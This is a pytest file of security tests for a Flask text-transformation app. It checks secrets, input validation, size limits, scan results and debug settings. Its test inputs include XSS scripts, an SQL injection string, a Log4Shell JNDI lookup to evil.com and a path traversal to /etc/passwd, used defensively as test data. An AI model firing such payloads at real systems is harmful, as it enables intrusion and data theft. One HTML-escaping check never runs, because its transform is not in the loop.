"""Security-focused tests for the Flask application."""

import json

import pytest

from tests.security_utils import run_bandit_security_scan, run_safety_check


class TestSecurityMeasures:
    """Test security aspects of the application."""

    @pytest.mark.unit
    def test_no_hardcoded_secrets(self):
        """Ensure no hardcoded secrets in configuration."""
        from app.config import Config, DevelopmentConfig, ProductionConfig

        # Check that sensitive values are not hardcoded
        configs = [Config, DevelopmentConfig, ProductionConfig]

        for config in configs:
            # SECRET_KEY should not be a simple string
            if hasattr(config, "SECRET_KEY") and config.SECRET_KEY:
                assert (
                    config.SECRET_KEY != "dev"
                ), "SECRET_KEY should not be 'dev' in production"
                assert (
                    len(config.SECRET_KEY) > 10
                ), "SECRET_KEY should be sufficiently long"

    @pytest.mark.api
    def test_json_input_validation(self, client):
        """Test that API properly validates JSON input to prevent injection."""
        # Test with malicious JSON
        malicious_payloads = [
            '{"text": "<script>alert(\'xss\')</script>", "transformation": "alternate_case"}',
            '{"text": "\'; DROP TABLE users; --", "transformation": "alternate_case"}',
            '{"text": "${jndi:ldap://evil.com/a}", "transformation": "alternate_case"}',
        ]

        for payload in malicious_payloads:
            response = client.post(
                "/transform", data=payload, content_type="application/json"
            )

            # Should either reject or sanitize, not crash
            assert response.status_code in [200, 400]

            if response.status_code == 200:
                result = json.loads(response.data)
                # Ensure malicious content is not reflected back as-is
                assert "script" not in result.get("transformed_text", "").lower()

    @pytest.mark.api
    def test_request_size_limits(self, client):
        """Test that large requests are properly handled."""
        # Test with very large text input
        large_text = "A" * 100000  # 100KB of text
        data = {"text": large_text, "transformation": "alternate_case"}

        response = client.post(
            "/transform", data=json.dumps(data), content_type="application/json"
        )

        # Should either process or reject gracefully, not crash
        assert response.status_code in [200, 400, 413]  # 413 = Payload Too Large

    @pytest.mark.unit
    def test_transformation_output_sanitization(self):
        """Test that transformations don't introduce security vulnerabilities."""
        from app.utils.text_transformers import TextTransformer

        transformer = TextTransformer()

        # Test with potentially dangerous inputs
        dangerous_inputs = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "${jndi:ldap://evil.com/a}",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "%3Cscript%3Ealert('xss')%3C/script%3E",
        ]

        for dangerous_input in dangerous_inputs:
            for transform in ["alternate_case", "backwards", "rot13"]:
                result = transformer.transform(dangerous_input, transform)

                # Result should be a string and not contain executable code
                assert isinstance(result, str)
                # For HTML-generating transformations, ensure proper escaping
                if (
                    transform == "rainbow_html"
                    and "<script>" in dangerous_input.lower()
                ):
                    assert (
                        "<script>" not in result.lower() or "&lt;script&gt;" in result
                    )

    @pytest.mark.slow
    def test_security_scan_results(self):
        """Run security scans and ensure no critical issues."""
        # This test runs the actual security tools
        bandit_results = run_bandit_security_scan()
        safety_results = run_safety_check()

        if bandit_results:
            # Check for high-severity issues
            high_severity_issues = [
                issue
                for issue in bandit_results.get("results", [])
                if issue.get("issue_confidence") == "HIGH"
                and issue.get("issue_severity") == "HIGH"
            ]

            # Fail if there are critical security issues
            assert (
                len(high_severity_issues) == 0
            ), f"Found {len(high_severity_issues)} high-severity security issues"

        if safety_results and isinstance(safety_results, list):
            # Fail if there are any known vulnerabilities
            assert (
                len(safety_results) == 0
            ), f"Found {len(safety_results)} known vulnerabilities in dependencies"

    @pytest.mark.api
    def test_http_headers_security(self, client):
        """Test that appropriate security headers are present."""
        response = client.get("/")

        # Check for security headers (these would be added by middleware)
        # Note: Your app might not have all these yet, so adjust as needed
        # recommended_headers = [
        #     'X-Content-Type-Options',
        #     'X-Frame-Options',
        #     'X-XSS-Protection',
        #     'Strict-Transport-Security',  # For HTTPS
        #     'Content-Security-Policy'
        # ]

        # For now, just ensure the response doesn't leak server information
        assert "Server" not in response.headers or "Flask" not in response.headers.get(
            "Server", ""
        )

    @pytest.mark.unit
    def test_no_debug_in_production(self):
        """Ensure debug mode is not enabled in production config."""
        from app.config import ProductionConfig

        assert not getattr(
            ProductionConfig, "DEBUG", False
        ), "Debug should be False in production"
        assert not getattr(
            ProductionConfig, "TESTING", False
        ), "Testing should be False in production"
